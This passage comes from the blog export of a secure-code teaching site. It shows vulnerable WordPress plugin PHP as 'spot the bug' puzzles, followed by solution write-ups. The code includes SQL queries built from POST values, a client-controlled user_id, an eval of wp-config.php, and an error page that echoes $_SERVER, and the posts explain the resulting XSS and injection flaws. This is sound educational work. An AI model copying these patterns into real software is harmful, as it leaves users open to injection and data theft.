					&lt;p&gt; &lt;?php _e('This option allows the user to automatically add the Slimbox effect to Picasaweb links when provided an appropriate url (this is separate from the autoload script which only functions on direct image links). &lt;b&gt;Default is Disabled.&lt;/b&gt;', 'wp-slimbox2'); ?&gt;
					&lt;/p&gt;
				&lt;/td&gt;
			&lt;/tr&gt;
			&lt;tr class='inactive'&gt;
				&lt;td class='name'&gt;&lt;?php _e('Enable Flickr Integration?', 'wp-slimbox2'); ?&gt;&lt;/td&gt;
				&lt;th scope='row' class='check-column'&gt;
					&lt;input type=&quot;checkbox&quot; name=&quot;wp_slimbox_flickr&quot;&lt;?php if ($options-&gt;get_option('flickr') == 'on') echo ' checked=&quot;yes&quot;';?&gt; /&gt;
				&lt;/th&gt;
				&lt;td class='desc'&gt;
					&lt;p&gt; &lt;?php _e('This option allows the user to automatically add the Slimbox effect to Flickr links when provided an appropriate url (this is separate from the autoload script which only functions on direct image links). &lt;b&gt;Default is Disabled.&lt;/b&gt;', 'wp-slimbox2'); ?&gt;
					&lt;/p&gt;
				&lt;/td&gt;
			&lt;/tr&gt;
			&lt;tr class='inactive'&gt;
				&lt;td class='name'&gt;&lt;?php _e('Loop?', 'wp-slimbox2'); ?&gt;&lt;/td&gt;
				&lt;th scope='row' class='check-column'&gt;
					&lt;input type=&quot;checkbox&quot; name=&quot;wp_slimbox_loop&quot;&lt;?php if ($options-&gt;get_option('loop') == 'on') echo ' checked=&quot;yes&quot;';?&gt; /&gt;
				&lt;/th&gt;
				&lt;td class='desc'&gt;
					&lt;p&gt; &lt;?php _e('This option allows the user to navigate between the first and last images of a Slimbox gallery group when there is more than one image to display. &lt;b&gt;Default is Disabled.&lt;/b&gt;', 'wp-slimbox2'); ?&gt;
					&lt;/p&gt;
				&lt;/td&gt;
			&lt;/tr&gt;
			&lt;tr class='inactive'&gt;
				&lt;td class='name'&gt;&lt;?php _e('Overlay Opacity', 'wp-slimbox2'); ?&gt;&lt;/td&gt;
				&lt;th scope='row' class='check-column'&gt;
					&lt;select name=&quot;wp_slimbox_overlayOpacity&quot;&gt;
					&lt;?php selectionGen($options-&gt;get_option('overlayOpacity'),$overlayOpacity); ?&gt;
					&lt;/select&gt;
				&lt;/th&gt;
				&lt;td class='desc'&gt;
					&lt;p&gt; &lt;?php _e('This option allows the user to adjust the opacity of the background overlay. 1 is completely opaque, 0 is completely transparent. &lt;b&gt;Default is 0.8.&lt;/b&gt;', 'wp-slimbox2'); ?&gt;
					&lt;/p&gt;
				&lt;/td&gt;
			&lt;/tr&gt;
			&lt;tr class='inactive'&gt;
				&lt;td class='name'&gt;&lt;?php _e('Overlay Color', 'wp-slimbox2'); ?&gt;&lt;/td&gt;
				&lt;th scope='row' class='check-column'&gt;
					&lt;input type=&quot;text&quot; id=&quot;wp_slimbox_overlayColor&quot; name=&quot;wp_slimbox_overlayColor&quot; value=&quot;&lt;?php echo $options-&gt;get_option('overlayColor'); ?&gt;&quot; size=&quot;7&quot; maxlength=&quot;7&quot;/&gt;&lt;div id=&quot;picker&quot;&gt;&lt;/div&gt;

				&lt;/th&gt;
				&lt;td class='desc'&gt;
					&lt;p&gt; &lt;?php _e('This option allows the user to set the color of the overlay by selecting your hue from the circle and color gradient from the square. Alternatively you may manually enter a valid HTML color code. The color of the entry field will change to reflect your selected color. &lt;b&gt;Default is #000000.&lt;/b&gt;', 'wp-slimbox2'); ?&gt;
					&lt;/p&gt;
				&lt;/td&gt;
			&lt;/tr&gt;
			&lt;tr class='inactive'&gt;
				&lt;td class='name'&gt;&lt;?php _e('Overlay Fade Duration', 'wp-slimbox2'); ?&gt;&lt;/td&gt;
				&lt;th scope='row' class='check-column'&gt;
					&lt;select name=&quot;wp_slimbox_overlayFadeDuration&quot;&gt;
					&lt;?php selectionGen($options-&gt;get_option('overlayFadeDuration'),$msArray); ?&gt;
					&lt;/select&gt;
				&lt;/th&gt;
				&lt;td class='desc'&gt;
					&lt;p&gt; &lt;?php _e('This option allows the user to adjust the duration of the overlay fade-in and fade-out animations, in milliseconds. &lt;b&gt;Default is 400.&lt;/b&gt;', 'wp-slimbox2'); ?&gt;
					&lt;/p&gt;
				&lt;/td&gt;
			&lt;/tr&gt;
			&lt;tr class='inactive'&gt;
				&lt;td class='name'&gt;&lt;?php _e('Resize Duration', 'wp-slimbox2'); ?&gt;&lt;/td&gt;
				&lt;th scope='row' class='check-column'&gt;
					&lt;select name=&quot;wp_slimbox_resizeDuration&quot;&gt;
					&lt;?php selectionGen($options-&gt;get_option('resizeDuration'),$msArray); ?&gt;
					&lt;/select&gt;
				&lt;/th&gt;
				&lt;td class='desc'&gt;
					&lt;p&gt; &lt;?php _e('This option allows the user to adjust the duration of the resize animation for width and height, in milliseconds. &lt;b&gt;Default is 400.&lt;/b&gt;', 'wp-slimbox2'); ?&gt;
					&lt;/p&gt;
				&lt;/td&gt;
			&lt;/tr&gt;
[/sourcecode] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1228</wp:post_id>
		<wp:post_date>2010-12-03 08:00:40</wp:post_date>
		<wp:post_date_gmt>2010-12-03 15:00:40</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>haircut-cross-site-scripting</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="avhec_catgroup" nicename="all"><![CDATA[All]]></category>
		<category domain="post_tag" nicename="cross-site-scripting"><![CDATA[cross site scripting]]></category>
		<category domain="category" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="markup"><![CDATA[markup]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="plugins"><![CDATA[plugins]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<category domain="post_tag" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/fykNOq]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[6a80bd2d0006f6cb1918e841004124ec]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Anyway</title>
		<link>http://spotthevuln.com/2010/12/anyway/</link>
		<pubDate>Mon, 06 Dec 2010 15:00:41 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1233</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>I wanted you to see what real courage is, instead of getting the idea that courage is a man with a gun in his hand. It's when you know you're licked before you begin but you begin anyway and you see it through no matter what.</strong> <br><strong> - Harper Lee
</strong></blockquote>
<pre lang="php"><?
// get our db settings without loading all of wordpress every save
$html = implode('', file("../../../wp-config.php"));
$html = str_replace ("require_once", "// ", $html);
$html = str_replace ("<?php", "", $html);
$html = str_replace ("?>", "", $html);
eval($html);

if (isset($_POST["id"]) && isset($_POST["user"]) && is_numeric($_POST["user"]) && isset($_POST["content"]) && is_numeric($_POST["content"])) {
	$date = substr($_POST["id"], 7);
	$user_id = $_POST["user"];
	$weight = round($_POST["content"], 1);
} else {
	print_r($_POST);
	echo "Please enter a valid number for your weight.";
	exit;
}

mysql_connect(DB_HOST, DB_USER, DB_PASSWORD);
mysql_select_db(DB_NAME);

$query = "update ".$table_prefix."hackdiet_weightlog set weight = $weight where wp_id = $user_id and date = \"".date("Y-m-d", $date)."\"";
mysql_query($query);
if (mysql_affected_rows() != 1) {
	// record doesn't exist yet, lets create it
	$query = "insert into ".$table_prefix."hackdiet_weightlog set date = \"".date("Y-m-d", $date)."\", weight = $weight, wp_id = $user_id";
	mysql_query($query);
	if (mysql_affected_rows() != 1) {
		echo "Save failed. - " . mysql_error();
		exit();
	} else {
		echo htmlspecialchars($weight);
	}
} else {
	echo htmlspecialchars($weight);
}

$query = "select trend from ".$table_prefix."hackdiet_weightlog where wp_id = $user_id and date < \"".date("Y-m-d", $date)."\" order by date desc limit 1";
$result = mysql_query($query);
if (mysql_num_rows($result) == 1) {
	$trend = mysql_result($result, 0);
	$use_first_weight_as_trend = false;
} else {
	// no trends exist below this entry, we must be first.  so in next query, we need to grab today's weight to be trend 1
	$use_first_weight_as_trend = true;
}

$query = "select date, weight, trend from ".$table_prefix."hackdiet_weightlog where wp_id = $user_id and date >= \"".date("Y-m-d", $date)."\" order by date asc";
$result = mysql_query($query);
while ($entry = mysql_fetch_assoc($result)) {
	if ($use_first_weight_as_trend) {
		$trend = $entry["weight"];
		$use_first_weight_as_trend = false;
	} else {
		// exponentially smoothed moving average with 10% smoothing
		$trend = $trend + 0.1 * ($entry["weight"] - $trend);
	}
	$entry["trend"] = $trend;
	$weights[] = $entry;
}

foreach ($weights as $entry) {
	$query = "update ".$table_prefix."hackdiet_weightlog set trend = ".round($entry["trend"], 1)." where wp_id = $user_id and date = \"".$entry["date"]."\"";
	mysql_query($query);
}

// 0 will always be the edited date, since the list contains the edited entry + all the ones after it, sorted asc.
$dif = round($weights[0]["weight"] - $weights[0]["trend"], 1);

echo "<span class=\"trend_dif ".(($dif < 0)?"good_trend":"bad_trend")."\">$dif</span>";
?>
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1233</wp:post_id>
		<wp:post_date>2010-12-06 08:00:41</wp:post_date>
		<wp:post_date_gmt>2010-12-06 15:00:41</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>anyway</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="avhec_catgroup" nicename="all"><![CDATA[All]]></category>
		<category domain="category" nicename="information"><![CDATA[Information]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/i4KK3P]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[f8b20f7812b7aee2a93a800f0790363d]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>1148</wp:comment_id>
			<wp:comment_author><![CDATA[Cross-Site Scripting (XSS), PHP, Privilege Escalation, Solution, Wordpress Vulnerability Code Example ~SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2010/12/anyway-cross-site-scripting/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2010-12-10 08:06:14</wp:comment_date>
			<wp:comment_date_gmt>2010-12-10 15:06:14</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Anyway [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>1129</wp:comment_id>
			<wp:comment_author><![CDATA[IndigoMann]]></wp:comment_author>
			<wp:comment_author_email>IndigoMann@gmail.com</wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP>79.140.73.72</wp:comment_author_IP>
			<wp:comment_date>2010-12-08 10:07:29</wp:comment_date>
			<wp:comment_date_gmt>2010-12-08 17:07:29</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[I found many bugs. They're sql-inj and XSS :) This code wrote very ugly and bad.]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Anyway - Cross Site Scripting</title>
		<link>http://spotthevuln.com/2010/12/anyway-cross-site-scripting/</link>
		<pubDate>Fri, 10 Dec 2010 15:00:56 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1236</guid>
		<description></description>
		<content:encoded><![CDATA[<h3>Details</h3>
Affected Software: The Hackers Diet

Fixed in Version: 9.7b

Issue Type: Cross Site Scripting (XSS)

Original Code: <a title="Anyway" href="http://spotthevuln.com/2010/12/anyway/" target="_blank">Found    Here</a>
<h3>Description</h3>
First, some logistics… the code we’re looking at belongs to the “Weight_save.php” file which is part of the “Hackers Diet” WordPress plugin.  This plugin was created to “Help you track and predict weight loss using your Wordpress blog”.  A single change was made to the Weight_save.php for this changelist.  The single change simply removes an obvious XSS bug in which POST parameters are printed to HTML markup.  This line was likely being used for debugging purposes and was forgotten during release to production.  A more robust testing and release process would have caught this.

Although the developers prevented an XSS vulnerability, they completely overlooked several other issues.  IndigoMann (via blog comments) noticed XSS and SQL Injection in this code…  The one issue that jumps out at me is this line:
<blockquote>$user_id = $_POST["user"];</blockquote>
I always become very suspicious when an application passes user_id’s back and forth.  Ideally, this data should be stored via session state, otherwise an attacker could pass an arbitrary value and access (and possibly update) another user’s data.  Looking at the code, it appears this may be the case with the Hacker Diet plugin.
<h3>Developers Solution</h3>
[sourcecode language="diff" highlight="14,15"]
&lt;?
// get our db settings without loading all of wordpress every save
$html = implode('', file(&quot;../../../wp-config.php&quot;));
$html = str_replace (&quot;require_once&quot;, &quot;// &quot;, $html);
$html = str_replace (&quot;&lt;?php&quot;, &quot;&quot;, $html);
$html = str_replace (&quot;?&gt;&quot;, &quot;&quot;, $html);
eval($html);

if (isset($_POST[&quot;id&quot;]) &amp;&amp; isset($_POST[&quot;user&quot;]) &amp;&amp; is_numeric($_POST[&quot;user&quot;]) &amp;&amp; isset($_POST[&quot;content&quot;]) &amp;&amp; is_numeric($_POST[&quot;content&quot;])) {
	$date = substr($_POST[&quot;id&quot;], 7);
	$user_id = $_POST[&quot;user&quot;];
	$weight = round($_POST[&quot;content&quot;], 1);
} else {
-	print_r($_POST);
+	//print_r($_POST);
	echo &quot;Please enter a valid number for your weight.&quot;;
	exit;
}

mysql_connect(DB_HOST, DB_USER, DB_PASSWORD);
mysql_select_db(DB_NAME);

$query = &quot;update &quot;.$table_prefix.&quot;hackdiet_weightlog set weight = $weight where wp_id = $user_id and date = \&quot;&quot;.date(&quot;Y-m-d&quot;, $date).&quot;\&quot;&quot;;
mysql_query($query);
if (mysql_affected_rows() != 1) {
	// record doesn't exist yet, lets create it
	$query = &quot;insert into &quot;.$table_prefix.&quot;hackdiet_weightlog set date = \&quot;&quot;.date(&quot;Y-m-d&quot;, $date).&quot;\&quot;, weight = $weight, wp_id = $user_id&quot;;
	mysql_query($query);
	if (mysql_affected_rows() != 1) {
		echo &quot;Save failed. - &quot; . mysql_error();
		exit();
	} else {
		echo htmlspecialchars($weight);
	}
} else {
	echo htmlspecialchars($weight);
}

$query = &quot;select trend from &quot;.$table_prefix.&quot;hackdiet_weightlog where wp_id = $user_id and date &lt; \&quot;&quot;.date(&quot;Y-m-d&quot;, $date).&quot;\&quot; order by date desc limit 1&quot;;
$result = mysql_query($query);
if (mysql_num_rows($result) == 1) {
	$trend = mysql_result($result, 0);
	$use_first_weight_as_trend = false;
} else {
	// no trends exist below this entry, we must be first.  so in next query, we need to grab today's weight to be trend 1
	$use_first_weight_as_trend = true;
}

$query = &quot;select date, weight, trend from &quot;.$table_prefix.&quot;hackdiet_weightlog where wp_id = $user_id and date &gt;= \&quot;&quot;.date(&quot;Y-m-d&quot;, $date).&quot;\&quot; order by date asc&quot;;
$result = mysql_query($query);
while ($entry = mysql_fetch_assoc($result)) {
	if ($use_first_weight_as_trend) {
		$trend = $entry[&quot;weight&quot;];
		$use_first_weight_as_trend = false;
	} else {
		// exponentially smoothed moving average with 10% smoothing
		$trend = $trend + 0.1 * ($entry[&quot;weight&quot;] - $trend);
	}
	$entry[&quot;trend&quot;] = $trend;
	$weights[] = $entry;
}

foreach ($weights as $entry) {
	$query = &quot;update &quot;.$table_prefix.&quot;hackdiet_weightlog set trend = &quot;.round($entry[&quot;trend&quot;], 1).&quot; where wp_id = $user_id and date = \&quot;&quot;.$entry[&quot;date&quot;].&quot;\&quot;&quot;;
	mysql_query($query);
}

// 0 will always be the edited date, since the list contains the edited entry + all the ones after it, sorted asc.
$dif = round($weights[0][&quot;weight&quot;] - $weights[0][&quot;trend&quot;], 1);

echo &quot;&lt;span class=\&quot;trend_dif &quot;.(($dif &lt; 0)?&quot;good_trend&quot;:&quot;bad_trend&quot;).&quot;\&quot;&gt;$dif&lt;/span&gt;&quot;;
?&gt;
[/sourcecode] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1236</wp:post_id>
		<wp:post_date>2010-12-10 08:00:56</wp:post_date>
		<wp:post_date_gmt>2010-12-10 15:00:56</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>anyway-cross-site-scripting</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="avhec_catgroup" nicename="all"><![CDATA[All]]></category>
		<category domain="post_tag" nicename="arbitrary-values"><![CDATA[arbitrary values]]></category>
		<category domain="category" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="markup"><![CDATA[markup]]></category>
		<category domain="post_tag" nicename="parameters"><![CDATA[parameters]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="plugins"><![CDATA[plugins]]></category>
		<category domain="category" nicename="privilege-escalation"><![CDATA[Privilege Escalation]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<category domain="post_tag" nicename="wordpress-plugin"><![CDATA[wordpress plugin]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/gTLPvV]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[7449a576a7c7bef2fb70e3efd2244d74]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Last</title>
		<link>http://spotthevuln.com/2010/12/last/</link>
		<pubDate>Mon, 13 Dec 2010 15:00:56 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1241</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>Human beings, who are almost unique in having the ability to learn from the experience of others, are also remarkable for their apparent disinclination to do so.</strong> <br><strong> - Douglas Adams
</strong></blockquote>
<pre lang="php"><?php
ob_start();
//http://www.askapache.com/htaccess/apache-status-code-headers-errordocument.html
/*
array( floor($code / 100)
 1=>'INFO', 2=>'SUCCESS', 3=>'REDIRECT', 4|5=>'ERROR', 4=>'CLIENT_ERROR', 5=>'SERVER_ERROR', 'VALID_RESPONSE');
*/

... <SNIP> ...

if (isset($_SERVER['REDIRECT_STATUS'])) $err_code = $_SERVER['REDIRECT_STATUS'];

$err_req_meth = $_SERVER['REQUEST_METHOD'];
$err_req = htmlentities(strip_tags($_SERVER['REQUEST_URI']));
$err_phrase = $err_status_codes[$err_code][0];
$err_body = str_replace(
 array('INTERROR', 'THEREQUESTURI', 'THEREQMETH'),
 array('The server encountered an internal error or misconfiguration and was unable to complete your request.',$err_req, $err_req_meth),$err_status_codes[$err_code][1]);

@header("HTTP/1.1 $err_code $err_phrase", 1);
@header("Status: $err_code $err_phrase", 1);

//400 || 408 || 413 || 414 || 500 || 503 || 501
//@header("Connection: close", 1);

if ( $err_code=='400'||$err_code=='403'||$err_code=='405'||$err_code[0]=='5'){
 @header("Connection: close", 1);
 if ($err_code == '405') @header('Allow: GET,HEAD,POST,OPTIONS,TRACE');
 echo "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n<html>\n<head>\n<title>{$err_code} {$err_phrase}</title>\n<h1>{$err_phrase}</h1>\n<p>{$err_body}<br>\n</p>\n</body></html>";
} else echo '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
       "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xml:lang="en" lang="en">
<head>
  <title>'.$err_code.' '.$err_phrase.'</title>
  <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
</head>
<body>
<h1>'.$err_code.' '.$err_phrase.'</h1>
<hr />
<p>
'.$err_body.'<br />
</p>
<pre>
'.print_r($_SERVER,1).'
</pre>
  </body>
</html>';
?>
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1241</wp:post_id>
		<wp:post_date>2010-12-13 08:00:56</wp:post_date>
		<wp:post_date_gmt>2010-12-13 15:00:56</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>last</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="avhec_catgroup" nicename="all"><![CDATA[All]]></category>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/dEBDBn]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[a0fc1e4fa40fc1faed514f3ee62dc75c]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>1258</wp:comment_id>
			<wp:comment_author><![CDATA[Cross-Site Scripting (XSS), PHP, Solution, Wordpress Vulnerability Code Example ~SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2010/12/last-cross-site-scripting/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2010-12-17 08:07:20</wp:comment_date>
			<wp:comment_date_gmt>2010-12-17 15:07:20</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Last [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1292598440.3241";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1292811540.4943";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
	</item>
	<item>
		<title>Last - Cross Site Scripting</title>
		<link>http://spotthevuln.com/2010/12/last-cross-site-scripting/</link>
		<pubDate>Fri, 17 Dec 2010 15:00:12 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1248</guid>
		<description></description>
		<content:encoded><![CDATA[<h3>Details</h3>
Affected Software: AskApache Password Protector

Fixed in Version: 4.0.1

Issue Type: Cross Site Scripting (XSS)

Original Code: <a title="Last" href="http://spotthevuln.com/2010/12/last/" target="_blank">Found    Here</a>
<h3>Description</h3>
Upon first glance, we see that the vulnerable code sample comes from an error page of some sort.  Error pages are often overlooked when it comes to security (or even general QA).  Make sure you put your error pages through the same rigorous security process as you would any other page.  The Same Origin Policy won’t distinguish between a forgotten error page and the highly trafficked portal page of your web application.  A vulnerability on an error page can have the same devastating effect as a vulnerability on the main portal page.  Looking at this bug, we see that the error page is a bit too helpful and echoes back all the information contained in the $_SERVER superglobal.  Unfortunately, this superglobal contains all sorts of user/attacker controlled information, resulting in XSS.  In this fix, the developers wisely removed the vulnerable line entirely.   
<h3>Developers Solution</h3>
[sourcecode language="diff" highlight="44"]
&lt;?php
ob_start();
//http://www.askapache.com/htaccess/apache-status-code-headers-errordocument.html
/*
array( floor($code / 100)
 1=&gt;'INFO', 2=&gt;'SUCCESS', 3=&gt;'REDIRECT', 4|5=&gt;'ERROR', 4=&gt;'CLIENT_ERROR', 5=&gt;'SERVER_ERROR', 'VALID_RESPONSE');
*/

... &lt;SNIP&gt; ...

if (isset($_SERVER['REDIRECT_STATUS'])) $err_code = $_SERVER['REDIRECT_STATUS'];

$err_req_meth = $_SERVER['REQUEST_METHOD'];
$err_req = htmlentities(strip_tags($_SERVER['REQUEST_URI']));
$err_phrase = $err_status_codes[$err_code][0];
$err_body = str_replace(
 array('INTERROR', 'THEREQUESTURI', 'THEREQMETH'),
 array('The server encountered an internal error or misconfiguration and was unable to complete your request.',$err_req, $err_req_meth),$err_status_codes[$err_code][1]);

@header(&quot;HTTP/1.1 $err_code $err_phrase&quot;, 1);
@header(&quot;Status: $err_code $err_phrase&quot;, 1);

//400 || 408 || 413 || 414 || 500 || 503 || 501
//@header(&quot;Connection: close&quot;, 1);

